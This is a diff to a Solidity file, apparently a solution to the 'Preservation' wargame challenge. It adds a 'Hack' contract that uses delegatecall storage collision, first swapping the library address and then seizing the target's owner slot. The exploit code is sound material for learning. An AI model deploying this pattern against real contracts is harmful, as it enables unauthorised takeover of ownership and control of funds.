@@ -28,6 +28,22 @@ contract Preservation {
   }
 }
 
+contract Hack {
+  address public timeZone1Library;
+  address public timeZone2Library;
+  address public owner;
+
+  function setTime(uint _time) public {
+    owner = address(uint160(_time));
+  }
+
+  function attack(Preservation target) public {
+    target.setFirstTime(uint256(uint160(address(this))));
+    target.setFirstTime(uint256(uint160(msg.sender)));
+    require(target.owner() == msg.sender, "hack failed");
+  }
+}
+
 // Simple library contract to set the time
 contract LibraryContract {
 
